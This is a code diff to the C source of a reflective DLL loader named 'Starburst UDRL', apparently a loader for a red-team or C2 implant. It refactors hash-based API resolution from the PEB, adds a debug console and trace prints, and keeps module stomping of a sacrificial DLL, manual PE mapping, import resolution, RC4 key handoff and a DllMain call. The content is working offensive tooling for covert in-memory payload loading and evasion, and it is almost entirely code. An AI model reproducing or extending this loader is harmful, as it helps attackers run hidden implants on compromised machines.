@@ -28,6 +28,18 @@
 #define FREE_LOADER  1
 #endif
 
+#ifdef DEBUG
+FUNC FILE *__cdecl __acrt_iob_funcs(unsigned index)
+{
+    STARDUST_INSTANCE
+    return &(API( __iob_func )()[index]);
+}
+
+#define stdin  (__acrt_iob_funcs(0))
+#define stdout (__acrt_iob_funcs(1))
+#define stderr (__acrt_iob_funcs(2))
+#endif
+
 /* PE section characteristics to memory protection */
 FUNC static DWORD SectionToProtect( DWORD ch ) {
     BOOL x = !!( ch & IMAGE_SCN_MEM_EXECUTE );
@@ -81,6 +93,30 @@ FUNC static VOID GenerateRc4Key( PBYTE Key ) {
     }
 }
 
+/* Resolve all DLLs and APIs using the X-macro pattern from DLL_LIST/API_LIST */
+FUNC static BOOL ResolveApis()
+{
+    STARDUST_INSTANCE
+
+    MOD( Ntdll )    = LdrModulePeb( H_MODULE_NTDLL );
+    MOD( Kernel32 ) = LdrModulePeb( H_MODULE_KERNEL32 );
+
+    RESOLVE( LoadLibraryA, Kernel32 );
+
+    if ( !MOD( Ntdll ) || !MOD( Kernel32 ) || !API( LoadLibraryA ) )
+        return FALSE;
+
+    #define DLL_ENTRY(mod) if ( !( MOD( mod ) = API( LoadLibraryA )( #mod ) ) ) return FALSE;
+    DLL_LIST
+    #undef DLL_ENTRY
+
+    #define API_ENTRY(api, mod) if ( !( RESOLVE( api, mod ) ) ) return FALSE;
+    API_LIST
+    #undef API_ENTRY
+
+    return TRUE;
+}
+
 /*
  * Main - Reflective DLL Loader entry point.
  *
@@ -96,23 +132,23 @@ FUNC VOID Main(
 
     /* ── Resolve APIs ── */
 
-    if ( ! ( Instance()->Modules.Kernel32 = LdrModulePeb( H_MODULE_KERNEL32 ) ) )
-        return;
-    if ( ! ( Instance()->Modules.Ntdll = LdrModulePeb( H_MODULE_NTDLL ) ) )
+    if ( ! ResolveApis() )
         return;
 
-    Instance()->Win32.LoadLibraryA           = LdrFunction( Instance()->Modules.Kernel32, HASH_STR( "LoadLibraryA"           ) );
-    Instance()->Win32.LoadLibraryExW         = LdrFunction( Instance()->Modules.Kernel32, HASH_STR( "LoadLibraryExW"         ) );
-    Instance()->Win32.GetProcAddress          = LdrFunction( Instance()->Modules.Kernel32, HASH_STR( "GetProcAddress"          ) );
-    Instance()->Win32.VirtualAlloc            = LdrFunction( Instance()->Modules.Kernel32, HASH_STR( "VirtualAlloc"            ) );
-    Instance()->Win32.VirtualProtect          = LdrFunction( Instance()->Modules.Kernel32, HASH_STR( "VirtualProtect"          ) );
-    Instance()->Win32.VirtualFree             = LdrFunction( Instance()->Modules.Kernel32, HASH_STR( "VirtualFree"             ) );
-    Instance()->Win32.NtFlushInstructionCache = LdrFunction( Instance()->Modules.Ntdll,    HASH_STR( "NtFlushInstructionCache" ) );
+#ifdef DEBUG
+    if ( API( AllocConsole )() )
+    {
+        HWND cWindows = API( GetConsoleWindow )();
+        API( freopen )("CONIN$", "r", stdin);
+        API( freopen )("CONOUT$", "w", stderr);
+        API( freopen )("CONOUT$", "w", stdout);
+        API( ShowWindow )(cWindows, SW_RESTORE);
+        API( SetForegroundWindow )(cWindows);
+        API( UpdateWindow )(cWindows);
+    }
+#endif
 
-    if ( ! Instance()->Win32.LoadLibraryA    || ! Instance()->Win32.GetProcAddress ||
-         ! Instance()->Win32.VirtualAlloc    || ! Instance()->Win32.VirtualProtect ||
-         ! Instance()->Win32.NtFlushInstructionCache )
-        return;
+    PRINT("Starburst UDRL starting...");
 
     /* ── Locate DLL payload ── */
 
@@ -133,6 +169,8 @@ FUNC VOID Main(
     if ( ! DllRaw || DllSize < sizeof(IMAGE_DOS_HEADER) )
         return;
 
+    PRINT("Located DLL payload: raw=%p size=%lu", DllRaw, DllSize);
+
     /* ── Parse PE headers ── */
 
     PIMAGE_DOS_HEADER Dos = C_PTR( DllRaw );
@@ -150,6 +188,8 @@ FUNC VOID Main(
 
     PIMAGE_SECTION_HEADER Sections = IMAGE_FIRST_SECTION( Nt );
 
+    PRINT("PE parsed: ImageSize=%lu Sections=%u PreferredBase=%p", ImageSize, NumSections, (PVOID)PreferredBase);
+
     /* ── Allocate target memory ── */
 
     PBYTE    MappedBase     = NULL;
@@ -159,7 +199,7 @@ FUNC VOID Main(
 
 #if LOAD_MODE == 1
     /* Module stomping: load a sacrificial DLL */
-    StompedModule = Instance()->Win32.LoadLibraryExW(
+    StompedModule = API( LoadLibraryExW )(
         STOMP_DLL, NULL, DONT_RESOLVE_DLL_REFERENCES );
     if ( ! StompedModule ) return;
 
@@ -171,13 +211,15 @@ FUNC VOID Main(
     MappedBase = (PBYTE) StompedModule;
 
     DWORD OldProt;
-    Instance()->Win32.VirtualProtect( MappedBase, ImageSize, PAGE_READWRITE, &OldProt );
+    API( VirtualProtect )( MappedBase, ImageSize, PAGE_READWRITE, &OldProt );
 #else
     /* Standard VirtualAlloc */
-    MappedBase = Instance()->Win32.VirtualAlloc(
+    MappedBase = API( VirtualAlloc )(
         NULL, ImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
     if ( ! MappedBase ) return;
 #endif
+
+    PRINT("Allocated image base at %p", MappedBase);
 
     /* ── Map PE sections ── */
 
@@ -196,6 +238,8 @@ FUNC VOID Main(
     /* Refresh header pointers to mapped copy */
     Dos = C_PTR( MappedBase );
     Nt  = C_PTR( MappedBase + Dos->e_lfanew );
+
+    PRINT("Sections mapped to %p", MappedBase);
 
     /* ── Process relocations ── */
 
@@ -240,6 +284,8 @@ FUNC VOID Main(
         }
     }
 
+    PRINT("Relocations applied (delta=%lld)", Delta);
+
     /* ── Resolve imports ── */
 
     DWORD ImportRva = Nt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ].VirtualAddress;
@@ -249,7 +295,7 @@ FUNC VOID Main(
 
         while ( Imp->Name ) {
             PCHAR ModName = C_PTR( MappedBase + Imp->Name );
-            HMODULE hMod  = Instance()->Win32.LoadLibraryA( ModName );
+            HMODULE hMod  = API( LoadLibraryA )( ModName );
 
             if ( ! hMod ) { Imp++; continue; }
 
@@ -262,14 +308,14 @@ FUNC VOID Main(
 
 #ifdef _WIN64
                 if ( OrigThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64 )
-                    Func = Instance()->Win32.GetProcAddress( hMod, (LPCSTR)( OrigThunk->u1.Ordinal & 0xFFFF ) );
+                    Func = API( GetProcAddress )( hMod, (LPCSTR)( OrigThunk->u1.Ordinal & 0xFFFF ) );
 #else
                 if ( OrigThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG32 )
-                    Func = Instance()->Win32.GetProcAddress( hMod, (LPCSTR)( OrigThunk->u1.Ordinal & 0xFFFF ) );
+                    Func = API( GetProcAddress )( hMod, (LPCSTR)( OrigThunk->u1.Ordinal & 0xFFFF ) );
 #endif
                 else {
                     PIMAGE_IMPORT_BY_NAME ImpName = C_PTR( MappedBase + OrigThunk->u1.AddressOfData );
-                    Func = Instance()->Win32.GetProcAddress( hMod, ImpName->Name );
+                    Func = API( GetProcAddress )( hMod, ImpName->Name );
                 }
 
                 IatThunk->u1.Function = (ULONGLONG)Func;
@@ -280,6 +326,8 @@ FUNC VOID Main(
         }
     }
 
+    PRINT("Imports resolved");
+
     /* ── Set section protections ── */
 
     Sections = IMAGE_FIRST_SECTION( Nt );
@@ -288,21 +336,23 @@ FUNC VOID Main(
             continue;
         DWORD Prot = SectionToProtect( Sections[i].Characteristics );
         DWORD Old;
-        Instance()->Win32.VirtualProtect(
+        API( VirtualProtect )(
             MappedBase + Sections[i].VirtualAddress,
             Sections[i].Misc.VirtualSize,
             Prot, &Old );
     }
 
-    { DWORD Old; Instance()->Win32.VirtualProtect( MappedBase, HeadersSize, PAGE_READONLY, &Old ); }
+    { DWORD Old; API( VirtualProtect )( MappedBase, HeadersSize, PAGE_READONLY, &Old ); }
+
+    PRINT("Section protections applied");
 
     /* ── Flush instruction cache ── */
 
-    Instance()->Win32.NtFlushInstructionCache( (HANDLE)-1, MappedBase, ImageSize );
+    API( NtFlushInstructionCache )( (HANDLE)-1, MappedBase, ImageSize );
 
     /* ── Populate UDRL_USER_DATA ── */
 
-    UDRL_USER_DATA *Ud = Instance()->Win32.VirtualAlloc(
+    UDRL_USER_DATA *Ud = API( VirtualAlloc )(
         NULL, sizeof(UDRL_USER_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
 
     if ( Ud ) {
@@ -331,6 +381,8 @@ FUNC VOID Main(
         GenerateRc4Key( Ud->rc4_key );
     }
 
+    PRINT("UDRL_USER_DATA at %p (magic=%llx)", Ud, Ud ? Ud->magic : 0);
+
     /* ── Call DllMain ── */
 
     typedef BOOL (WINAPI *fnDllMain)( HINSTANCE, DWORD, LPVOID );
@@ -338,6 +390,7 @@ FUNC VOID Main(
     DWORD EntryRva = Nt->OptionalHeader.AddressOfEntryPoint;
     if ( EntryRva ) {
         fnDllMain pDllMain = C_PTR( MappedBase + EntryRva );
+        PRINT("Calling DllMain at %p", pDllMain);
         pDllMain( (HINSTANCE)MappedBase, DLL_PROCESS_ATTACH, (LPVOID)Ud );
     }
 
